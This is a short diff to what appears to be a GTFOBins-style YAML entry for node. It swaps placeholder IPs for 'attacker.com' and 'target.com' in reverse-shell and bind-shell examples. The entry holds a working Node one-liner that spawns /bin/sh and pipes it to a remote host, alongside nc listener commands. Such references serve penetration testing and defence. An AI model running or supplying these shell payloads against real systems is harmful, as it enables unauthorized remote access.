@@ -12,7 +12,7 @@ functions:
   reverse-shell:
     - description: Run `nc -l -p 12345` to receive the shell on the other end.
       code: |
-        export RHOST=10.0.0.1
+        export RHOST=attacker.com
         export RPORT=12345
         node -e 'sh = require("child_process").spawn("/bin/sh");
         net.connect(process.env.RPORT, process.env.RHOST, function () {
@@ -21,7 +21,7 @@ functions:
           sh.stderr.pipe(this);
         });'
   bind-shell:
-    - description: Run `nc 10.0.0.1 12345` to connect to the shell on the other end.
+    - description: Run `nc target.com 12345` to connect to the shell on the other end.
       code: |
         export LPORT=12345
         node -e 'sh = require("child_process").spawn("/bin/sh");
